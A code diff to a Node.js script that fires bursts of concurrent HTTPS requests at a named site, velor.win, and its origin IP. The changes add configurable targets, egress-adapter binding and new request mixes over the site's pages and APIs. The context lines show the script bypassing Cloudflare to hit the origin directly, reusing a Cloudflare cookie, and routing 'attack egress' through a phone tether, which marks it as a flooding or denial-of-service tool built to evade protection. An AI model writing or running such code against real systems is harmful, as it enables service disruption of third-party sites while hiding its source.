@@ -19,7 +19,7 @@ try{ if(fs.existsSync('cf_cookie.txt') && !process.env.CF_COOKIE){ process.env.C
 const MODE=process.argv[2]||'probe';
 const W=parseInt(process.argv[3]||(MODE==='burst'?30:MODE==='hold'?100:8),10);
 const DUR=parseInt(process.argv[4]||'15',10);
-const HOST='velor.win', IP='57.131.163.31';
+const HOST=process.env.TARGET_HOST||'velor.win', IP=process.env.TARGET_IP||'57.131.163.31';
 const LOCAL=process.env.LOCAL_IP||null; // optional: bind attack egress to a specific local adapter IP (e.g. phone tether)
 const PACE=parseInt(process.env.PACE_MS||'0',10);
 const DIRECT=process.env.ORIGIN_DIRECT==='1'; // bypass Cloudflare: connect straight to the origin IP, SNI/Host = velor.win
@@ -46,6 +46,7 @@ function req(o={}){
     const done=v=>{if(fin)return;fin=true;clearTimeout(wd);res(v);};
     const opt={host:DIRECT?IP:HOST,port:443,path,method,agent,headers:h,localAddress:LOCAL||undefined};
     if(DIRECT)opt.servername=HOST;
+    if(LOCAL){ opt.family = LOCAL.indexOf(':')>=0 ? 6 : 4; }
     const q=https.request(opt,s=>{
       let n=0,b=''; s.on('data',c=>{n+=c.length;if(b.length<400)b+=c;});
       s.on('end',()=>done({code:s.statusCode,ms:Math.round(performance.now()-t0),bytes:n,
@@ -94,6 +95,22 @@ function pick(i){
       return{path:'/api/track',method:'POST',body:'{oops'};
     case 'static': return {path:'/robots.txt',method:'GET'};
     case 'favicon': return {path:'/favicon.png',method:'GET'};
+    case 'root': return {path:'/',method:'GET'};
+    case 'etk4':{ const c=i%10;
+      if(c<4)return{path:'/',method:'GET'};
+      if(c<7)return{path:'/api/matches',method:'GET'};
+      if(c<9)return{path:'/api/leaderboard/teams',method:'GET'};
+      return{path:'/api/leaderboard',method:'GET'}; }
+    case 'etk3':{ const c=i%10;
+      if(c<5)return{path:'/api/matches',method:'GET'};
+      if(c<7)return{path:'/api/leaderboard/teams',method:'GET'};
+      if(c<8)return{path:'/api/leaderboard',method:'GET'};
+      return{path:'/api/auth/user',method:'GET'}; }
+    case 'etk':{ const c=i%5;
+      if(c<2)return{path:'/',method:'GET'};
+      if(c<3)return{path:'/favicon.ico',method:'GET'};
+      if(c<4)return{path:'/manifest.json',method:'GET'};
+      return{path:'/apple-touch-icon.png',method:'GET'}; }
     case 'ssr':    return {path:'/',method:'GET'};
     case 'ssr2':   return {path:'/leaderboard',method:'GET'};
     case 'bundle': return {path:'/assets/index-CYtIz3va.js',method:'GET',
